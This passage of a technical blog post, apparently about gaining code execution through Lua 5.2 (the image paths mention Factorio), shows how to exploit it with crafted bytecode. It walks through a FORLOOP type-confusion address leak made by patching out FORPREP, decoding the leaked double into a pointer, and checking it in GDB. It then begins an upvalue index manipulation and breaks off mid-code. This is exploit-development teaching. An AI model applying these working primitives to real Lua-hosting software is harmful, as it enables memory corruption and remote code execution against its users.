</span></span></code></pre></div><p>As <code>step</code> is not type checked, its value will be passed to the <code>nvalue</code> call to get its value</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>lua_Number step <span style="color:#f92672">=</span> <span style="color:#a6e22e">nvalue</span>(ra<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>);
</span></span></code></pre></div><p>Where <code>nvalue</code> is a macro used to access the number contained in a <code>TValue</code> that represents a number</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define nvalue(o)	check_exp(ttisnumber(o), num_(o))
</span></span></span></code></pre></div><p><code>check_exp</code> is another macro that <strong>triggers a Lua assert if the first parameter is not true</strong>. As the <code>ttisnumber</code> macro checks if the object passed is a Number, this check seems to prevent us from confusing types on Lua. However, the <code>check_exp</code> macro has to be enabled on compile
time to trigger an assert and by default does nothing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">/* internal assertions for in-house debugging */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(lua_assert)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define check_exp(c,e)		(lua_assert(c), (e))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#else
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define lua_assert(c)		((void)0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define check_exp(c,e)		(e)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span></code></pre></div><p>As this assertion is disabled, <strong>type is not checked</strong> and the <code>num_</code> macro is executed with any object we pass to the function, leaking the value of the <code>Value</code> attribute of the <code>TValue</code> passed (which can be a pointer)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define val_(o)		((o)-&gt;value_)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define num_(o)		(val_(o).n)
</span></span></span></code></pre></div><p>All this means that if we craft our own bytecode, we could leverage the type confusion and leak addresses. This is an example of why the ability to execute our own bytecode is so powerful, it allows us to <strong>create circunstances that the compiler would never generate from source code</strong>.</p>
<p>Let&rsquo;s craft our own bytecode to exploit this vulnerability. The bytecode generated by the compiler is the following, notice how the <code>FORLOOP</code> opcode is preceded by a <code>FORPREP</code> opcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>	[<span style="color:#ae81ff">2</span>]	LOADK    	<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>	; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>	[<span style="color:#ae81ff">2</span>]	LOADK    	<span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>	; <span style="color:#ae81ff">1000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>	[<span style="color:#ae81ff">2</span>]	MOVE     	<span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>	[<span style="color:#ae81ff">2</span>]	FORPREP  	<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>	; to <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>	[<span style="color:#ae81ff">2</span>]	RETURN   	<span style="color:#ae81ff">4</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>	[<span style="color:#ae81ff">2</span>]	FORLOOP  	<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>	; to <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span>	[<span style="color:#ae81ff">3</span>]	RETURN   	<span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>We can patch this opcode to remove the type check and leverage the type confusion in <code>FORLOOP</code>, as <strong>there is no check in the bytecode verifier that prevents us from removing it</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>	[<span style="color:#ae81ff">2</span>]	LOADK    	<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>	; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">2</span>	[<span style="color:#ae81ff">2</span>]	LOADK    	<span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>	; <span style="color:#ae81ff">1000000000000</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">3</span>	[<span style="color:#ae81ff">2</span>]	MOVE     	<span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">4</span>	[<span style="color:#ae81ff">2</span>]	JMP      	<span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>	; to <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">5</span>	[<span style="color:#ae81ff">2</span>]	RETURN   	<span style="color:#ae81ff">4</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">6</span>	[<span style="color:#ae81ff">2</span>]	FORLOOP  	<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>	; to <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">7</span>	[<span style="color:#ae81ff">3</span>]	RETURN   	<span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>With this change we can start leaking addresses. Let&rsquo;s try to leak the address of a string</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>asnum <span style="color:#f92672">=</span> loadstring(string.dump(<span style="color:#66d9ef">function</span>(x)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1000000000000</span>, x <span style="color:#66d9ef">do</span> <span style="color:#66d9ef">return</span> i <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>):gsub(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61\0\0\x80</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\0\0\128</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>foo <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Memory Corruption&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(asnum(foo))
</span></span></code></pre></div><p>Running this code gives us an <strong>odd double value</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>MemoryCorruption src<span style="color:#f92672">]</span> ./lua poc.lua 
</span></span><span style="display:flex;"><span>2.1944577826691e-317
</span></span></code></pre></div><p>As we have seen before, all numbers in Lua are represented as <strong>doubles</strong><sup id="fnref1:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>, so when we try to leak a pointer,
<strong>Lua thinks the value is also double</strong>. However, <em>pointers are not doubles</em>, so
they are <strong>not encoded as such</strong>, leading to <em>odd values</em> when used as doubles.</p>
<p>As we already know that Lua doesn&rsquo;t have integers, we need a way to <strong>properly encode</strong> the pointers as doubles to obtain the real value. And for that,
we first need to <strong>understand what are floating-point numbers</strong>.</p>
<h4 id="ieee-754-double-precision">IEEE 754 double-precision</h4>
<p>Doubles are represented using the <strong>IEEE 754 binary64 format</strong>. In this format, they are formed by three parts:</p>
<ul>
<li><strong>Sign</strong>: 1 bit</li>
<li><strong>Exponent</strong>: 11 bits</li>
<li><strong>Mantissa</strong>: 52 bits</li>
</ul>
<p>
  
    <img src="/posts/rce-lua-factorio/double.svg" alt="Double Representation" title="Sign: 1 bit. Exponent: 11 bits. Mantissa: 52 bits"
        loading="lazy"
        referrerpolicy="same-origin"
    >
          <figcaption>Sign: 1 bit. Exponent: 11 bits. Mantissa: 52 bits</figcaption>
  </p>
<p>So they are basically <strong>64 bits of data</strong>, nothing makes them intrinsically different from an <code>integer</code>, the only difference
is the way bits get interpreted. We already knew this, as this is what allows them to be stored inline in the <code>Value</code> union</p>
<p>This also means that in Python we can just pack it to bytes an then unpack it as a <code>integer</code> to obtain the pointer we leaked, as they have the same size.</p>

<div class="alert alert-warning">This <strong>only works in our case</strong> as the leak is a <em>&ldquo;fake&rdquo;</em> floating-point number. Doing this for <em>real</em> floating-point numbers will lead to <strong>errors</strong>
</div>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert the floating-point number to a number</span>
</span></span><span style="display:flex;"><span>double_bytes <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, <span style="color:#ae81ff">2.1944577826691e-317</span>)
</span></span><span style="display:flex;"><span>number <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, double_bytes)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(hex(number)) <span style="color:#75715e"># Output: 0x43c620</span>
</span></span></code></pre></div><p>Unfortunately, with Lua <strong>things gets complicated</strong>. Lua 5.2 doesn&rsquo;t have the ability to pack/unpack, and more important, <strong>it doesn&rsquo;t even have integers</strong>.</p>
<p>That means that as we can&rsquo;t represent our leak as a real <code>integer</code>, beyond <strong>53 bits</strong> we will encounter <strong>precision limitations</strong> when trying to represent integers, as from that point, integers <strong>no longer fit in the mantissa</strong> and only some numbers will not suffer from precision limitations <sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup>. But there is also a <strong>bright side</strong>, we have
<strong>53 bits in which there is no difference between the precision of an integer and a double</strong>.</p>
<p>As <strong>53 bits</strong> <del>ought to be enough for anyone</del> are <strong>enough to leak adresses</strong>, we just need a way to convert <strong>fake doubles to properly encoded doubles</strong>.</p>
<h5 id="from-doubles-to-doubles-the-painful-way">From &ldquo;Doubles&rdquo; to Doubles; The Painful Way</h5>
<p>If we had a way to access the bits of the double, the conversion would be easy. However, we can&rsquo;t use bitwise operations, because <em>what does it even mean to do a bitwise operation on a double?</em> We need to find a different way to obtain the bits of a float</p>
<p>The most comprensible way that I know is by using the <code>string.format</code> method with the <code>%a</code> format string.</p>
<p>This provides us a string containing the <em>double</em> in hexadecimal. We will specifically use <code>%.13a</code> to
force a mantissa of 13 hex characters (52 bits) to be printed so we don&rsquo;t have to pad it ourselves.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- We use the value we leaked before as an example</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> double_as_string <span style="color:#f92672">=</span> string.format(<span style="color:#e6db74">&#34;%.13a&#34;</span>, <span style="color:#ae81ff">2.1944577826691e-317</span>)
</span></span><span style="display:flex;"><span>print(double_as_string)
</span></span></code></pre></div><p>This provides us with the string: <code>0x0.000000043c620p-1022</code>, which corresponds to: <sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup></p>
<ul>
<li><strong>First part</strong>: indicates if the double is <strong>denormalized</strong> (<code>0x0</code> if denormalized).</li>
<li><strong>Second part</strong>: mantissa hex encoded followed by <code>p</code> character</li>
<li><strong>Third part</strong>: exponent part <strong>decimal</strong> encoded</li>
</ul>
<p>
  
    <img src="/posts/rce-lua-factorio/double_hex.svg" alt="Hex Encoding of Double" title="Number is denormalized. Mantissa is `000000043c620p`. Exponent is `-1022`"
        loading="lazy"
        referrerpolicy="same-origin"
    >
          <figcaption>Number is denormalized. Mantissa is <code>000000043c620p</code>. Exponent is <code>-1022</code></figcaption>
  </p>
<p>This uncovers a new interesting fact about floating-point numbers. As we know from the output of the Python code, our leaked value is <code>0x43c620</code>. Which as we can see, is basically the value of the <strong>mantissa</strong>.
<em>But what about the exponent?</em> With our current knowledge of floating-point numbers, <strong>we can&rsquo;t explain an exponent of -1022</strong>. As far as we know, it <strong>should be zero</strong>, <em>what is happening here?</em></p>
<h5 id="exponent-bias">Exponent Bias</h5>
<p>This discrepancy occurs due to the way floating-point numbers are encoded. The <em>exponent</em> of floating-point numbers use biased representation<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup>, which is a way to
encode <strong>signed numbers</strong> by encoding the offset from a number known as the <em>bias</em>: <code>exponent = encoded_value - bias</code></p>
<p>In the case of doubles, this <em>bias</em> is <code>1023</code>, which means that the exponent will take values between <code>-1022</code> and <code>1023</code></p>
<ul>
<li><code>encoded_exp = 00000101010 = 42</code> -&gt; <code>exponent = 42 - 1023 = -981</code></li>
<li><code>encoded_exp = 11111010000 = 2000</code> -&gt; <code>exponent = 2000 - 1023 = 977</code></li>
</ul>
<p>As you might already notice, if the exponent has <strong>11 bits</strong>, that means that it can represent <code>2**11 = 2048</code> possible values, but we are missing <strong>two</strong>, when they are all <code>0</code> and when
they are all <code>1</code>. This is because they have an <strong>especial meaning</strong>:</p>
<ul>
<li><code>encoded_exp = 00000000000</code> means that the number is <strong>denormalized</strong> (or a <strong>signed zero</strong> if the mantissa is 0)</li>
<li><code>encoded_exp = 11111111111</code> means <strong>Inf</strong> (if mantissa 0) or <strong>NaN</strong> (if mantissa is not zero)</li>
</ul>
<p>This explains <strong>why our pointer has an ood value</strong>. Lua thinks it is a <strong>denormalized</strong> number as the exponent was zero while the mantissa was not zero.</p>
<p>Denormalized numbers are basically <strong>very small numbers</strong>. For a double, they start at values smaller than <code>2**-1022</code> <sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>print(string.format(<span style="color:#e6db74">&#34;%.13a&#34;</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">^-</span><span style="color:#ae81ff">1022</span>))
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Output: 0x1.0000000000000p-1022 (Value different from 0x0 means normal number)</span>
</span></span><span style="display:flex;"><span>print(string.format(<span style="color:#e6db74">&#34;%.13a&#34;</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">^-</span><span style="color:#ae81ff">1023</span>))
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Output: 0x0.8000000000000p-1022 (0x0 means denormalized number)</span>
</span></span></code></pre></div><p>This is also <strong>why the exponent of our leaked value was -1022</strong>. As our number was denormalized and it was indicated by the first part of the output, the exponent is no longer useful for us (as it only indicated that is denormalized, which we already knew), so it seems to be fixed at <code>-1022</code>, the smallest representable exponent.</p>
<h5 id="are-we-double-yet">Are we double yet?</h5>
<p>There are basically <strong>two cases</strong> we need to handle:</p>
<ul>
<li><strong>Denormalized Numbers</strong>: the integer value fits in the <em>mantissa</em>, we decode the mantissa to obtain the correct double.</li>
<li><strong>Normal numbers</strong>: the value <em>does not fit in the mantissa</em>. The best we can do to recover the original value is to calculate the number as <code>(exponent + 1023) * 2^52 + mantissa</code> (if the number is not representable as a double, we lose data doing this)</li>
</ul>

<div class="alert alert-info">If we really wanted to handle <em>any number</em> without losing data, we could store the value in <strong>two doubles</strong> and make functions to operate with them as an <code>integer</code>
</div>

<p>Here is a Lua implementation of this idea:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">double_to_number</span>(double)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- Force representation of mantissa with 13 bytes of precision</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> double_as_string <span style="color:#f92672">=</span> string.format(<span style="color:#e6db74">&#34;%.13a&#34;</span>, double)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> denormalized, mantissa, exponent <span style="color:#f92672">=</span> string.match(double_as_string,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;-?0x([a-fx0-9]*).([a-f0-9]*)p?(-?[0-9]*)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- Convert to number</span>
</span></span><span style="display:flex;"><span>    denormalized <span style="color:#f92672">=</span> tonumber(denormalized, <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    mantissa <span style="color:#f92672">=</span> tonumber(mantissa, <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    exponent <span style="color:#f92672">=</span> tonumber(exponent)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> denormalized <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- If denormalized, it means that the leaked value had zeros</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- in the position of the exponent</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- That means the number fits the mantissa, </span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- so we don&#39;t have to do anything with our new double to represent it</span>
</span></span><span style="display:flex;"><span>        real_exponent <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- In this case, the leaked value had a value different</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- value from zero in the exponent.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- That means the number does NOT fit the mantissa.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- We need to calculate the real value and then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">-- try to represent it as a double</span>
</span></span><span style="display:flex;"><span>        real_exponent <span style="color:#f92672">=</span> (exponent <span style="color:#f92672">+</span> <span style="color:#ae81ff">1023</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">52</span> <span style="color:#75715e">-- Shift 52 bits (size of mantissa)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> real_exponent <span style="color:#f92672">+</span> mantissa
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>Which we can finally add to our <code>FORLOOP</code> code to transform the leaked pointer</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>foo <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Memory Corruption&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> asnum(foo)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Leak: &#34;</span> <span style="color:#f92672">..</span> leak)
</span></span><span style="display:flex;"><span>print(string.format(<span style="color:#e6db74">&#34;Pointer: 0x%x&#34;</span>, double_to_number(leak)))
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Output:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Leak: 2.1965605260578e-317</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Pointer: 0x43d6c0</span>
</span></span></code></pre></div><p>We can then check in GDB that <code>0x43d6c0</code> is in fact the correct pointer:</p>
<pre tabindex="0"><code>pwndbg&gt; x/20s 0x43d6c0
0x43d6c0:	&#34;\340nC&#34;
0x43d6c4:	&#34;&#34;
0x43d6c5:	&#34;&#34;
0x43d6c6:	&#34;&#34;
0x43d6c7:	&#34;&#34;
0x43d6c8:	&#34;\004\002&#34;
0x43d6cb:	&#34;&#34;
0x43d6cc:	&#34;\222\311X+\021&#34;
0x43d6d2:	&#34;&#34;
0x43d6d3:	&#34;&#34;
0x43d6d4:	&#34;&#34;
0x43d6d5:	&#34;&#34;
0x43d6d6:	&#34;&#34;
0x43d6d7:	&#34;&#34;
0x43d6d8:	&#34;Memory Corruption&#34;
0x43d6ea:	&#34;&#34;
0x43d6eb:	&#34;&#34;
0x43d6ec:	&#34;&#34;
0x43d6ed:	&#34;&#34;
0x43d6ee:	&#34;&#34;
</code></pre><p>Our string is not exactly at the address leaked as we leaked the address of a TString structure, the internal representation of strings in Lua</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">union</span> <span style="color:#a6e22e">TString</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                     8 */</span>    L_Umaxalign dummy;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                    24 */</span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      0      |       8 */</span>        GCObject <span style="color:#f92672">*</span>next;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      8      |       1 */</span>        lu_byte tt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      9      |       1 */</span>        lu_byte marked;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     10      |       1 */</span>        lu_byte extra;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  1-byte hole      */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     12      |       4 */</span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> hash;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     16      |       8 */</span>        size_t len;
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* total size (bytes):   24 */</span>
</span></span><span style="display:flex;"><span>     } tsv;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* total size (bytes):   24 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The real string is after this header, that is, <code>24 bytes</code> after the leaked pointer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x43d6c0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x43d6d8</span><span style="color:#f92672">:</span>	<span style="color:#e6db74">&#34;Memory Corruption&#34;</span>
</span></span></code></pre></div><h2 id="confusing-upvalues">Confusing Upvalues</h2>
<p>Now that we have a way to leak addresses, we need a primitive that allows us to retrieve fake objects. To do this, we first need to understand how <strong>upvalues</strong> and <strong>Closures</strong> work in Lua.</p>
<h3 id="what-are-upvalues">What are Upvalues?</h3>
<p><strong>Upvalues</strong> are a way <strong>to access variables outside the scope of the current function</strong>. Consider the following example that calculates the Fibonacci secuence:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fibonacci</span>(n)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> a <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> b <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">nextValue</span>()
</span></span><span style="display:flex;"><span>     <span style="color:#75715e">-- &#39;a&#39; and &#39;b&#39; are upvalues, as they are defined in the outer function</span>
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> a <span style="color:#f92672">+</span> b
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, n <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>		tmp <span style="color:#f92672">=</span> a
</span></span><span style="display:flex;"><span>		a <span style="color:#f92672">=</span> nextValue()
</span></span><span style="display:flex;"><span>		b <span style="color:#f92672">=</span> tmp
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> b
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>The <code>nextValue</code> function accesses both <code>a</code> and <code>b</code> variables even if they are outside its scope, that is because both variables are defined as upvalues. We can see that this is true by taking a look
at its bytecode:</p>
<pre tabindex="0"><code>upvalues (2) for nextValue:
	0	a	1	1
	1	b	1	2
</code></pre><p>The format of the upvalues section is the following:</p>
<ol>
<li><strong>Index</strong>: position in the upvalues array of the function</li>
<li><strong>Name</strong>: name of the upval</li>
<li><strong>In Stack</strong>: indicates if the upval is located in the stack (one if located in the stack)</li>
<li><strong>Stack Index</strong>: offset of the upval from the base address of the stack</li>
</ol>
<p>So we know that both <code>a</code> and <code>b</code> are upvalues located in the stack, with <code>a</code> located at <code>base + 1</code> and <code>b</code> at <code>base + 2</code></p>
<h3 id="the-gift-that-keeps-on-giving">The Gift that Keeps on Giving</h3>
<p>As you might start thinking, we control the bytecode that gets loaded, and <strong>upvalues are defined in the bytecode</strong>, <em>what happens if we modify the index of an upvalue to point to a different offset of the stack?</em></p>
<p>Let&rsquo;s try it, first we define a function that has three upvalues</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> foo
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> bar
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> target
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>      print(foo)
</span></span><span style="display:flex;"><span>      print(bar)
</span></span><span style="display:flex;"><span>      print(target)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>)()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>If we execute the code <em>without any modification to the bytecode</em>, we get <code>nil</code> as the output, as the upvalues haven&rsquo;t been assigned any value yet</p>
<pre tabindex="0"><code>[MemoryCorruption src]$ ./lua poc.lua 
nil
nil
nil
</code></pre><p>Now we are going to <strong>manipulate the index</strong> of the <code>target</code> upval. To do this, we need to know its current position:</p>

<div class="alert alert-info">The <code>_ENV</code> upvalue is used to get the address of the <code>print</code> function, and is not important for our purposes
</div>

<pre tabindex="0"><code>upvalues (4) for 0xd587a0:
	0	_ENV	0	0
	1	foo	1	0
	2	bar	1	1
	3	target	1	2
</code></pre><p>As it is currently <code>2</code>, we are going to increase it to <code>3</code>. We can do that with this code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> string.dump(<span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> foo
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">local</span> bar
